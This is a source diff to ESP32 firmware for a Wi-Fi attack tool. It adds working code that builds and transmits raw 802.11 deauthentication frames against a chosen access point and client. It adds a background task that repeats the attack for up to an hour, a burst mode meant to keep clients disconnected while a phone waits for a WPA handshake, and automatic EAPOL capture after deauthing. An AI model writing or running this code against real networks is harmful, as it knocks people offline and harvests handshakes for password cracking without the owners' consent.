@@ -308,6 +308,136 @@ static bool parseMac(const char* str, uint8_t out[6]) {
                   &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
 }
 
+struct DeauthTxStats {
+    uint32_t requested = 0;
+    uint32_t sent = 0;
+    uint32_t failed = 0;
+};
+
+static DeauthTxStats transmitDeauthFrames(
+    const uint8_t bssid[6],
+    const uint8_t client[6],
+    uint32_t count,
+    uint16_t intervalMs,
+    uint8_t reason
+) {
+    DeauthTxStats stats;
+    stats.requested = count;
+
+    uint8_t deauthFrame[26] = {
+        0xC0, 0x00, 0x00, 0x00,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x07
+    };
+    memcpy(deauthFrame + 4, client, 6);
+    memcpy(deauthFrame + 10, bssid, 6);
+    memcpy(deauthFrame + 16, bssid, 6);
+
+    uint16_t seq = 0x0010;
+    for (uint32_t i = 0; i < count; i++) {
+        deauthFrame[22] = seq & 0xFF;
+        deauthFrame[23] = (seq >> 8) & 0xFF;
+        deauthFrame[25] = reason;
+        if (esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), true) == ESP_OK) {
+            stats.sent++;
+        } else {
+            stats.failed++;
+        }
+        seq += 0x0010;
+        if (intervalMs > 0 && i + 1 < count) delay(intervalMs);
+    }
+    return stats;
+}
+
+static volatile bool gDeauthLoopActive = false;
+static volatile bool gDeauthLoopStopRequested = false;
+static TaskHandle_t gDeauthLoopTaskHandle = nullptr;
+static uint8_t gDeauthLoopBssid[6] = {0};
+static uint8_t gDeauthLoopClient[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+static uint32_t gDeauthLoopDurationSec = 0;
+static uint16_t gDeauthLoopIntervalMs = 100;
+static uint8_t gDeauthLoopReason = 7;
+static uint32_t gDeauthLoopSent = 0;
+static uint32_t gDeauthLoopFailed = 0;
+static uint32_t gDeauthLoopStartedMs = 0;
+
+static void sendDeauthLoopStatsEvent(const char* status, bool stopped) {
+    JsonDocument ev;
+    ev["status"] = status;
+    ev["mode"] = "loop";
+    ev["sent_frames"] = gDeauthLoopSent;
+    ev["failed_frames"] = gDeauthLoopFailed;
+    ev["duration_s"] = gDeauthLoopDurationSec;
+    ev["interval_ms"] = gDeauthLoopIntervalMs;
+    ev["elapsed_ms"] = gDeauthLoopStartedMs == 0 ? 0 : (millis() - gDeauthLoopStartedMs);
+    ev["stopped"] = stopped;
+    proto.sendEvent("deauth_stats", ev);
+}
+
+static void deauthLoopTaskFn(void*) {
+    uint8_t frame[26] = {
+        0xC0, 0x00, 0x00, 0x00,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x07
+    };
+    memcpy(frame + 4, gDeauthLoopClient, 6);
+    memcpy(frame + 10, gDeauthLoopBssid, 6);
+    memcpy(frame + 16, gDeauthLoopBssid, 6);
+
+    const uint32_t durationMs = gDeauthLoopDurationSec * 1000UL;
+    uint16_t seq = 0x0010;
+    uint32_t lastStatsMs = millis();
+
+    while (!gDeauthLoopStopRequested) {
+        const uint32_t elapsedMs = millis() - gDeauthLoopStartedMs;
+        if (durationMs > 0 && elapsedMs >= durationMs) break;
+
+        frame[22] = seq & 0xFF;
+        frame[23] = (seq >> 8) & 0xFF;
+        frame[25] = gDeauthLoopReason;
+        if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true) == ESP_OK) {
+            gDeauthLoopSent++;
+        } else {
+            gDeauthLoopFailed++;
+        }
+        seq += 0x0010;
+
+        if (millis() - lastStatsMs >= 2000) {
+            lastStatsMs = millis();
+            sendDeauthLoopStatsEvent("running", false);
+        }
+
+        uint32_t sleepMs = gDeauthLoopIntervalMs;
+        if (durationMs > 0) {
+            const uint32_t remainingMs = durationMs > elapsedMs
+                ? durationMs - elapsedMs
+                : 0;
+            if (remainingMs < sleepMs) sleepMs = remainingMs;
+        }
+        if (sleepMs > 0) vTaskDelay(pdMS_TO_TICKS(sleepMs));
+        else vTaskDelay(pdMS_TO_TICKS(1));
+    }
+
+    gDeauthLoopActive = false;
+    sendDeauthLoopStatsEvent("finished", gDeauthLoopStopRequested);
+    gDeauthLoopTaskHandle = nullptr;
+    vTaskDelete(nullptr);
+}
+
+static void stopDeauthLoopAndWait(uint32_t timeoutMs = 1200) {
+    if (!gDeauthLoopActive && gDeauthLoopTaskHandle == nullptr) return;
+    gDeauthLoopStopRequested = true;
+    const uint32_t started = millis();
+    while (gDeauthLoopActive && millis() - started < timeoutMs) {
+        delay(10);
+    }
+    if (!gDeauthLoopActive) gDeauthLoopTaskHandle = nullptr;
+}
+
 static const char* authModeStr(wifi_auth_mode_t mode) {
     switch (mode) {
         case WIFI_AUTH_OPEN:            return "OPEN";
@@ -326,6 +456,7 @@ static const char* authModeStr(wifi_auth_mode_t mode) {
 // Stop every radio/network subsystem before starting a new one.
 // Call this at the top of any CMD that touches Wi-Fi TX/RX.
 static void stopRadioModules() {
+    stopDeauthLoopAndWait();
     mesh.stop();
     sniffer.stop();
     deauthDetector.stop();
@@ -913,8 +1044,106 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         }
     }
 
+    // ── DEAUTH_BURST (capture-preserving) ────────────────────────────────
+    // Sends a finite deauth burst without stopping an active sniffer. Android
+    // uses this to retry deauth while waiting for a handshake capture.
+    else if (strcmp(cmd, "DEAUTH_BURST") == 0) {
+        JsonVariant args = doc["args"];
+        const char* band = args["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+
+        uint8_t channel = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
+        if (!isValidWifiChannel(channel)) {
+            proto.sendResp(id, false, "invalid channel");
+            return;
+        }
+        String regulatoryError;
+        if (!validateRegulatoryChannel(channel, regulatoryError)) {
+            proto.sendResp(id, false, regulatoryError.c_str());
+            return;
+        }
+
+        uint32_t count = args["count"].as<uint32_t>() ? args["count"].as<uint32_t>() : 1;
+        count = constrain(count, 1U, 200U);
+        uint16_t intervalMs = args["deauth_interval_ms"].as<uint16_t>() ?
+            args["deauth_interval_ms"].as<uint16_t>() : 50;
+        intervalMs = constrain(intervalMs, 10, 10000);
+        uint8_t reason = args["reason"].as<uint8_t>() ? args["reason"].as<uint8_t>() : 7;
+
+        const char* bssidStr = args["bssid"] | "";
+        const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";
+        uint8_t bssid[6] = {0};
+        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+        if (!parseMac(bssidStr, bssid)) {
+            proto.sendResp(id, false, "invalid bssid");
+            return;
+        }
+        if (!parseMac(clientStr, client)) {
+            proto.sendResp(id, false, "invalid client");
+            return;
+        }
+
+        esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        if (setupErr != ESP_OK) {
+            String msg = "channel set failed: ";
+            msg += esp_err_to_name(setupErr);
+            proto.sendResp(id, false, msg.c_str());
+            return;
+        }
+        wifi_config_t apCfg = {};
+        setupErr = esp_wifi_get_config(WIFI_IF_AP, &apCfg);
+        if (setupErr == ESP_OK) {
+            apCfg.ap.channel = channel;
+            setupErr = esp_wifi_set_config(WIFI_IF_AP, &apCfg);
+        }
+        if (setupErr == ESP_OK) {
+            setupErr = esp_wifi_start();
+        }
+        if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
+            String msg = "WiFi setup failed: ";
+            msg += esp_err_to_name(setupErr);
+            proto.sendResp(id, false, msg.c_str());
+            return;
+        }
+        delay(20);
+
+        DeauthTxStats stats = transmitDeauthFrames(
+            bssid, client, count, intervalMs, reason
+        );
+
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["mode"] = "burst";
+        resp["channel"] = channel;
+        resp["requested_frames"] = stats.requested;
+        resp["sent_frames"] = stats.sent;
+        resp["failed_frames"] = stats.failed;
+        resp["interval_ms"] = intervalMs;
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
+    // ── DEAUTH_STOP ──────────────────────────────────────────────────────
+    else if (strcmp(cmd, "DEAUTH_STOP") == 0) {
+        const uint32_t sent = gDeauthLoopSent;
+        const uint32_t failed = gDeauthLoopFailed;
+        stopDeauthLoopAndWait();
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["sent_frames"] = sent;
+        resp["failed_frames"] = failed;
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
     // ── DEAUTH / DEAUTH_CAPTURE ──────────────────────────────────────────
-    // ★ FIXED: channel sync, esp_wifi_start(), error checking, for-loop
     else if (strcmp(cmd, "DEAUTH") == 0 || strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
         JsonVariant args = doc["args"];
 
@@ -926,8 +1155,7 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
             return;
         }
 
-        // Robust parsing with sane defaults
-        uint8_t  channel    = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
+        uint8_t channel = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
         if (!isValidWifiChannel(channel)) {
             proto.sendResp(id, false, "invalid channel");
             return;
@@ -937,85 +1165,131 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
             proto.sendResp(id, false, regulatoryError.c_str());
             return;
         }
-        uint32_t count      = args["count"].as<uint32_t>()   ? args["count"].as<uint32_t>()   : 150;
-        uint8_t  reason     = args["reason"].as<uint8_t>()  ? args["reason"].as<uint8_t>()  : 7;
 
-        uint16_t intervalMs = 100;
-        if (args.containsKey("deauth_interval_ms")) {
-            intervalMs = args["deauth_interval_ms"].as<uint16_t>();
-        } else if (args.containsKey("interval")) {
-            intervalMs = args["interval"].as<uint16_t>();
-        }
+        const char* mode = args["mode"] | "burst";
+        const bool loopMode = strcmp(mode, "loop") == 0 && strcmp(cmd, "DEAUTH") == 0;
+        uint32_t count = args["count"].as<uint32_t>() ? args["count"].as<uint32_t>() : 150;
+        count = constrain(count, 1U, 2000U);
+        uint32_t durationSec = args["duration"].as<uint32_t>() ? args["duration"].as<uint32_t>() : 30;
+        durationSec = constrain(durationSec, 0U, 3600U);
+        uint8_t reason = args["reason"].as<uint8_t>() ? args["reason"].as<uint8_t>() : 7;
+        uint16_t intervalMs = args["deauth_interval_ms"].as<uint16_t>() ?
+            args["deauth_interval_ms"].as<uint16_t>() : 100;
+        intervalMs = constrain(intervalMs, 10, 10000);
 
-        const char* bssidStr  = args["bssid"]  | "00:00:00:00:00:00";
+        const char* bssidStr = args["bssid"] | "";
         const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";
-
         uint8_t bssid[6] = {0};
-        uint8_t client[6] = {0};
-        parseMac(bssidStr, bssid);
-        parseMac(clientStr, client);
+        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+        if (!parseMac(bssidStr, bssid)) {
+            proto.sendResp(id, false, "invalid bssid");
+            return;
+        }
+        if (!parseMac(clientStr, client)) {
+            proto.sendResp(id, false, "invalid client");
+            return;
+        }
 
-        // Stop sniffing and set radio channel
         radioIdle();
-        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-
-        // ★ CRITICAL FIX: sync the AP interface channel with the radio
-        wifi_config_t ap_cfg = {};
-        if (esp_wifi_get_config(WIFI_IF_AP, &ap_cfg) == ESP_OK) {
-            ap_cfg.ap.channel = channel;
-            esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
-        }
-        esp_wifi_start();        // ensure WiFi stack is fully operational
-        delay(250);             // let the radio settle
-
-
-        // Build deauth frame template
-        uint8_t deauth_frame[26] = {
-            0xC0, 0x00, 0x00, 0x00,
-            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,   // Addr1 (Client)
-            0x00,0x00,0x00,0x00,0x00,0x00,   // Addr2 (BSSID)
-            0x00,0x00,0x00,0x00,0x00,0x00,   // Addr3 (BSSID)
-            0x00, 0x00, 0x00, 0x07            // Seq + Reason
-        };
-
-        memcpy(deauth_frame + 4,  client, 6);
-        memcpy(deauth_frame + 10, bssid,  6);
-        memcpy(deauth_frame + 16, bssid,  6);
-
-        uint32_t total_sent = 0;
-        uint16_t seq = 0x0010;
-
-        for (uint32_t i = 0; i < count; i++) {
-            deauth_frame[22] = seq & 0xFF;
-            deauth_frame[23] = (seq >> 8) & 0xFF;
-            deauth_frame[25] = reason;
-
-            esp_err_t tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, 26, true);
-            if (tx_err == ESP_OK) total_sent++;
-
-            seq += 0x0010;
-            delay(intervalMs);
+        esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        if (setupErr != ESP_OK) {
+            String msg = "channel set failed: ";
+            msg += esp_err_to_name(setupErr);
+            proto.sendResp(id, false, msg.c_str());
+            return;
         }
 
-        // Optionally start EAPOL capture after deauth
+        wifi_config_t apCfg = {};
+        setupErr = esp_wifi_get_config(WIFI_IF_AP, &apCfg);
+        if (setupErr == ESP_OK) {
+            apCfg.ap.channel = channel;
+            setupErr = esp_wifi_set_config(WIFI_IF_AP, &apCfg);
+        }
+        if (setupErr == ESP_OK) {
+            setupErr = esp_wifi_start();
+        }
+        if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
+            String msg = "WiFi setup failed: ";
+            msg += esp_err_to_name(setupErr);
+            proto.sendResp(id, false, msg.c_str());
+            return;
+        }
+        delay(250);
+
+        if (loopMode) {
+            gDeauthLoopSent = 0;
+            gDeauthLoopFailed = 0;
+            gDeauthLoopDurationSec = durationSec;
+            gDeauthLoopIntervalMs = intervalMs;
+            gDeauthLoopReason = reason;
+            memcpy(gDeauthLoopBssid, bssid, 6);
+            memcpy(gDeauthLoopClient, client, 6);
+            gDeauthLoopStartedMs = millis();
+            gDeauthLoopStopRequested = false;
+            gDeauthLoopActive = true;
+
+            BaseType_t created = xTaskCreate(
+                deauthLoopTaskFn,
+                "deauthLoop",
+                4096,
+                nullptr,
+                1,
+                &gDeauthLoopTaskHandle
+            );
+            if (created != pdPASS) {
+                gDeauthLoopActive = false;
+                gDeauthLoopTaskHandle = nullptr;
+                proto.sendResp(id, false, "failed to start deauth loop task");
+                return;
+            }
+
+            JsonDocument resp;
+            resp["ok"] = true;
+            resp["mode"] = "loop";
+            resp["active"] = true;
+            resp["channel"] = channel;
+            resp["duration"] = durationSec;
+            resp["interval_ms"] = intervalMs;
+            String json;
+            serializeJson(resp, json);
+            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+            return;
+        }
+
+        DeauthTxStats stats = transmitDeauthFrames(
+            bssid, client, count, intervalMs, reason
+        );
+
         if (strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
             sniffer.setEapolFilter(true, bssid);
             sniffer.startFixed(channel, bandMode != WifiBandMode::BAND_2G);
         }
 
-        // Send stats
         JsonDocument statsDoc;
-        statsDoc["status"]       = "finished";
-        statsDoc["bssid"]        = bssidStr;
-        statsDoc["client"]       = clientStr;
-        statsDoc["channel"]      = (int)channel;
-        statsDoc["count"]        = count;
-        statsDoc["interval_ms"]  = intervalMs;
-        statsDoc["reason"]       = reason;
-        statsDoc["sent_frames"]  = total_sent;
+        statsDoc["status"] = "finished";
+        statsDoc["mode"] = "burst";
+        statsDoc["bssid"] = bssidStr;
+        statsDoc["client"] = clientStr;
+        statsDoc["channel"] = (int)channel;
+        statsDoc["count"] = count;
+        statsDoc["requested_frames"] = stats.requested;
+        statsDoc["sent_frames"] = stats.sent;
+        statsDoc["failed_frames"] = stats.failed;
+        statsDoc["interval_ms"] = intervalMs;
+        statsDoc["reason"] = reason;
         proto.sendEvent("deauth_stats", statsDoc);
 
-        proto.sendResp(id, true, "deauth completed");
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["mode"] = "burst";
+        resp["channel"] = channel;
+        resp["requested_frames"] = stats.requested;
+        resp["sent_frames"] = stats.sent;
+        resp["failed_frames"] = stats.failed;
+        resp["interval_ms"] = intervalMs;
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
     }
 
     // ── DEAUTH_CHANNEL_CAPTURE ───────────────────────────────────────────
